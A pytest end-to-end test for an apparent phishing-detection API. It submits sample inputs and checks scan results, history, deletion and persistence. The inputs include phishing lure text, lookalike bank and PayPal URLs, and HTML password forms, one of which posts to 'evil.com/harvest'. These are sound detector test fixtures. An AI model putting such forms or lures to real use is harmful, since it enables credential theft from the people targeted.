"""End-to-end integration and workflow verification test for Section 5."""

from __future__ import annotations

import io
import pytest
from PIL import Image
from fastapi.testclient import TestClient

from app.db.database import SessionLocal
from app.db.models import ScanRecord


@pytest.fixture(autouse=True)
def clean_db():
    db = SessionLocal()
    db.query(ScanRecord).delete()
    db.commit()
    db.close()
    yield
    db = SessionLocal()
    db.query(ScanRecord).delete()
    db.commit()
    db.close()


def test_complete_section5_end_to_end_workflow(client: TestClient):

    # 1. Open dashboard (check initial state)
    dash_init = client.get("/api/dashboard/statistics")
    assert dash_init.status_code == 200
    assert dash_init.json()["total_scans"] == 0

    # 2. Submit a URL
    url_resp = client.post("/api/scans/url", json={"url": "https://secure-banking-login.com/auth"})
    assert url_resp.status_code == 200
    url_data = url_resp.json()
    assert "scan_id" in url_data and url_data["scan_id"]
    assert "prediction" in url_data
    url_scan_id = url_data["scan_id"]

    # 3. Submit an email
    email_resp = client.post(
        "/api/scans/email",
        json={
            "sender": "security-alert@suspicious-bank.com",
            "subject": "Urgent: Verify your account credentials now",
            "body": "Dear customer, your account will be suspended within 24 hours. Click to verify your password immediately.",
        },
    )
    assert email_resp.status_code == 200
    email_data = email_resp.json()
    assert "scan_id" in email_data and email_data["scan_id"]
    assert email_data["prediction"] in {"phishing", "suspicious"}
    email_scan_id = email_data["scan_id"]

    # 4. Upload a screenshot
    img_buf = io.BytesIO()
    Image.new("RGB", (120, 80), color="blue").save(img_buf, format="PNG")
    screenshot_resp = client.post(
        "/api/scans/screenshot",
        files={"file": ("screenshot.png", img_buf.getvalue(), "image/png")},
    )
    assert screenshot_resp.status_code == 200
    screenshot_data = screenshot_resp.json()
    assert "scan_id" in screenshot_data and screenshot_data["scan_id"]
    screenshot_scan_id = screenshot_data["scan_id"]

    # 5. Submit HTML
    html_resp = client.post(
        "/api/scans/html",
        json={
            "html": "<html><body><form action='http://192.168.1.1/login' method='post'><input type='password' name='pass'/></form></body></html>"
        },
    )
    assert html_resp.status_code == 200
    html_data = html_resp.json()
    assert "scan_id" in html_data and html_data["scan_id"]
    html_scan_id = html_data["scan_id"]

    # 6. Run multimodal analysis with supported inputs
    fusion_resp = client.post(
        "/api/scans/multimodal",
        json={
            "url": "https://paypal-security-alert.xyz/verify",
            "email": {
                "sender": "service@paypal-security.xyz",
                "subject": "Account Lockout Warning",
                "body": "Your account has been locked. Verify immediately.",
            },
            "html": "<form action='http://evil.com/harvest'><input type='password' name='passwd'/></form>",
        },
    )
    assert fusion_resp.status_code == 200
    fusion_data = fusion_resp.json()
    assert fusion_data["overall_prediction"] in {"phishing", "suspicious"}
    assert set(fusion_data["modalities_analyzed"]) == {"url", "email", "html"}
    assert fusion_data["scan_id"]
    fusion_scan_id = fusion_data["scan_id"]

    # 7. View explanations for the multimodal scan
    explain_resp = client.get(f"/api/scans/{fusion_scan_id}/explain")
    assert explain_resp.status_code == 200
    explain_data = explain_resp.json()
    assert "explanation" in explain_data
    assert len(explain_data["explanation"]) > 0

    # 8. View scan history
    hist_resp = client.get("/api/scans/history?page=1&page_size=20")
    assert hist_resp.status_code == 200
    hist_data = hist_resp.json()
    assert hist_data["total"] == 5
    assert len(hist_data["scans"]) == 5

    # 9. Search and filter history
    filter_resp = client.get("/api/scans/history?scan_type=email")
    assert filter_resp.status_code == 200
    assert filter_resp.json()["total"] == 1
    assert filter_resp.json()["scans"][0]["id"] == email_scan_id

    # 10. Open scan details
    detail_resp = client.get(f"/api/scans/{url_scan_id}")
    assert detail_resp.status_code == 200
    assert detail_resp.json()["id"] == url_scan_id
    assert detail_resp.json()["scan_type"] == "url"

    # 11. Delete a test scan
    del_resp = client.delete(f"/api/scans/{screenshot_scan_id}")
    assert del_resp.status_code == 200
    check_del = client.get(f"/api/scans/{screenshot_scan_id}")
    assert check_del.status_code == 404

    # 12. Confirm dashboard statistics update
    dash_updated = client.get("/api/dashboard/statistics")
    assert dash_updated.status_code == 200
    dash_stats = dash_updated.json()
    assert dash_stats["total_scans"] == 4  # 5 minus 1 deleted
    assert dash_stats["high_risk"] + dash_stats["suspicious"] + dash_stats["safe"] == 4

    # 13. Restart the backend simulation (recreate DB session & verify persistence)
    new_db = SessionLocal()
    persisted_count = new_db.query(ScanRecord).count()
    assert persisted_count == 4
    persisted_ids = {r.id for r in new_db.query(ScanRecord).all()}
    assert fusion_scan_id in persisted_ids
    assert url_scan_id in persisted_ids
    assert email_scan_id in persisted_ids
    assert html_scan_id in persisted_ids
    assert screenshot_scan_id not in persisted_ids
    new_db.close()

    # 14. Confirm history persists via API
    hist_after = client.get("/api/scans/history")
    assert hist_after.status_code == 200
    assert hist_after.json()["total"] == 4
